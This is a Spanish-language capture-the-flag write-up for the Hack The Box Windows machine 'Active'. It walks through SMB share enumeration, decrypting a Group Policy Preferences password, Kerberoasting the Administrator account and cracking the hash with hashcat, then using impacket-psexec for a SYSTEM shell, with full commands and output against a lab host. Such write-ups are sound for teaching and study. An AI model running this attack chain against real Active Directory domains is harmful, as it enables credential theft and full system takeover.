---
title: Active
date: 2025-12-26 18:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, active ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/5837ac5e28291146a9f2a8a015540c28.png
    alt: Hack The Box
---

> Active
Windows · Easy 

## Task 1

How many SMB shares are shared by the target?

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ smbclient -L 10.129.22.254
Password for [WORKGROUP\pmartinezr]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.22.254 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
> 7

## Task 2 

What is the name of the share that allows anonymous read access?
                                                                                       
``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ smbmap -H 10.129.10.21    

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                                                               [|] Checking for open ports...                                                                                               [*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.10.21:445        Name: 10.129.10.21              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
[*] Closed 1 connections                                                                                                     
                          
```
```smbmap``` es muy útil para agilizar estos descubrimientos. 

> Replication


## Task 3

Which file has encrypted account credentials in it?

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ smbclient '\\10.129.25.119\Replication' -N -c 'prompt OFF;recurse ON;mget *'   
Anonymous login successful
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.5 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (16.3 KiloBytes/sec) (average 3.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (3.0 KiloBytes/sec) (average 3.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (4.1 KiloBytes/sec) (average 3.2 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (8.0 KiloBytes/sec) (average 4.4 KiloBytes/sec)
```

Me decargo todo lo que se encuentra en ``Replication``

``` xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
Encuentro un archivo ```Groups.xml``` que contiene unas credenciales

>  Groups.xml

## Task 4

What is the decrpyted password for the SVC_TGS account?

``` shell
┌──(pmartinezr㉿kali)-[~/htb/active]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```
[https://github.com/t0thkr1s/gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)

Las Preferencias de Directiva de Grupo (GPP) se introdujeron en Windows Server 2008 y permiten a los administradores establecer contraseñas de dominio mediante la Directiva de Grupo. Sin embargo, las contraseñas se cifran con una clave AES-256 pública, lo que facilita su descifrado.

> GPPstillStandingStrong2k18


## Submit User Flag

Submit the flag located on the security user's desktop.

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ smbclient -N //10.129.25.119 svc_tgs --password=GPPstillStandingStrong2k18
smb: \SVC_TGS\Desktop\> get user.txt
```
Nos descargamos la flag.

> 28211704bc1468fab************


## Task 6

Which service account on Active is vulnerable to Kerberoasting?

``` shell
┌──(pmartinezr㉿kali)-[~/htb/active]
└─$ impacket-GetUserSPNs -dc-ip 10.129.25.119 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request    
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2025-12-26 19:49:46.822943             


[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$97efad5df18a89934465befde62403d1$c316d3dce9957e5bb7edbad6ffc4525d03252160613a0703d631d49f97571c1d4c250bd38cd2f73bfa02699cf1a2a70eb254000a58deb0bb03583ec78d51f55f6ed38e1beed791d7d6a02594c77a23abfe61c5ff92384b6364ec03aa83b662be60a35d8a79d5f6389201f19fb6473a817118036169314bb8daba417890e3d593357111a8f2841b3cc71c9d77c556368f0593a223fdd3c6c807fae4a3080017d0c575b66cdf8559dd55ea0805e727f89300af88e4448ae45acc86a88e1d9aeb7359547fbc82a4a4aae949997a4acb061cd158e019c8da0418b398aaaf948dd0692f2248507db7d63260bb4b70861750340df62e7dcaa83e84aadc35d36ad65967e45c9506e5dff79d2b35064a0601c2549b7a7255d332102b229abf209bbed89e255e53a8528729c46ea49399c586ad4f16bb1eff5bce50bd98eeaf62cf7cdd9e80ef60240a51c634fbdfbfac97387e31e923f10a7959a5cc4d10d8ffbb6528eeae92e4b5d7c55cec269e92b3443abb59b2d54c6393d03525c48e5af9733532da567b7e326b2b7d285f8ab3f86fac4b110eee4e8c99f6440596f476643b850430242102eac5aeadd53788e13780d5024653853ae493c1be15ac2dd5877705a4e752ad8b76bd7a53592e828a9fe5c091dd8ec793e2780a5a680c8249151d79ddfad9a0be47fccb9958238a77677d1d35ba0a6f82739ee3bf98b266ef56f007738926865bf1eb565fd892505ee4830b05c12293e50844331195ad16ada912553b8dbbfa321e7c44a9c28788dc7cfa5cf1894ccf736c9288d8c9730d4f5e5297a777e3b5483c9f94af900877104780268237992893b00a6d11cca65f4f885d18a491b93788a4fd66e3cc46b801a8d6aad373afd2f0aa8ef679aa6b2b7525d5a710017f9ff58627ad41a8d8b6f9fcc864bda7f1c71dcf80a15d080e8d3f61ead0339006215b10a486c2ce2739f9510638993aff81ec3590975a40e2bd92f1c4036b4e226000631677507cb46017bc44b7ebcccb8d7922eac75845135d97c52d2b98c9adedaebaedffe6e420065395fcb279e37b486cabe36167fe68a0483072524040dd3a99cd49c89a6084e62d6ff90fe23e431e4c89e65d4b8b103d7b78635499560376c5c23a87ba404ce1ab499196506d492727a642df83b93b007eb13e019aef1e706ffdbbd58212922032f4534f39ff102e0494d82c326cf29e65d2b708b5f88a9933dceabab8bbb256a40c6d6025bb8739361b07ed43816501
```
La utilidad ```impacket-GetUserSPNs``` sirve para explotar configuraciones inseguras de SPNs en dominios de Active Directory

> Administrator

## Task 7

What is the plaintext password for the administrator account?

``` shell                                                                                                                           
┌──(pmartinezr㉿kali)-[~/htb/active]
└─$ hashcat -m 13100 hash_administrator /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-bdver1-AMD FX(tm)-4300 Quad-Core Processor, 1469/2939 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory allocated for this attack: 512 MB (934 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$97efad5df18a89934465befde62403d1$c316d3dce9957e5bb7edbad6ffc4525d03252160613a0703d631d49f97571c1d4c250bd38cd2f73bfa02699cf1a2a70eb254000a58deb0bb03583ec78d51f55f6ed38e1beed791d7d6a02594c77a23abfe61c5ff92384b6364ec03aa83b662be60a35d8a79d5f6389201f19fb6473a817118036169314bb8daba417890e3d593357111a8f2841b3cc71c9d77c556368f0593a223fdd3c6c807fae4a3080017d0c575b66cdf8559dd55ea0805e727f89300af88e4448ae45acc86a88e1d9aeb7359547fbc82a4a4aae949997a4acb061cd158e019c8da0418b398aaaf948dd0692f2248507db7d63260bb4b70861750340df62e7dcaa83e84aadc35d36ad65967e45c9506e5dff79d2b35064a0601c2549b7a7255d332102b229abf209bbed89e255e53a8528729c46ea49399c586ad4f16bb1eff5bce50bd98eeaf62cf7cdd9e80ef60240a51c634fbdfbfac97387e31e923f10a7959a5cc4d10d8ffbb6528eeae92e4b5d7c55cec269e92b3443abb59b2d54c6393d03525c48e5af9733532da567b7e326b2b7d285f8ab3f86fac4b110eee4e8c99f6440596f476643b850430242102eac5aeadd53788e13780d5024653853ae493c1be15ac2dd5877705a4e752ad8b76bd7a53592e828a9fe5c091dd8ec793e2780a5a680c8249151d79ddfad9a0be47fccb9958238a77677d1d35ba0a6f82739ee3bf98b266ef56f007738926865bf1eb565fd892505ee4830b05c12293e50844331195ad16ada912553b8dbbfa321e7c44a9c28788dc7cfa5cf1894ccf736c9288d8c9730d4f5e5297a777e3b5483c9f94af900877104780268237992893b00a6d11cca65f4f885d18a491b93788a4fd66e3cc46b801a8d6aad373afd2f0aa8ef679aa6b2b7525d5a710017f9ff58627ad41a8d8b6f9fcc864bda7f1c71dcf80a15d080e8d3f61ead0339006215b10a486c2ce2739f9510638993aff81ec3590975a40e2bd92f1c4036b4e226000631677507cb46017bc44b7ebcccb8d7922eac75845135d97c52d2b98c9adedaebaedffe6e420065395fcb279e37b486cabe36167fe68a0483072524040dd3a99cd49c89a6084e62d6ff90fe23e431e4c89e65d4b8b103d7b78635499560376c5c23a87ba404ce1ab499196506d492727a642df83b93b007eb13e019aef1e706ffdbbd58212922032f4534f39ff102e0494d82c326cf29e65d2b708b5f88a9933dceabab8bbb256a40c6d6025bb8739361b07ed43816501:Ticketmaster1968
```

> Ticketmaster1968

## Submit Root Flag

Submit the flag located on the administrator's desktop.

``` shell
┌──(pmartinezr㉿kali)-[~/htb/active]
└─$ impacket-psexec 'administrator:Ticketmaster1968@10.129.25.119'                                     
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.25.119.....
[*] Found writable share ADMIN$
[*] Uploading file JMSZAmcU.exe
[*] Opening SVCManager on 10.129.25.119.....
[*] Creating service dBTZ on 10.129.25.119.....
[*] Starting service dBTZ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

c:\Users\Administrator\Desktop> type root.txt
5fcd71baf69ff5e3************
```

> 5fcd71baf69ff5e3************

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/148)





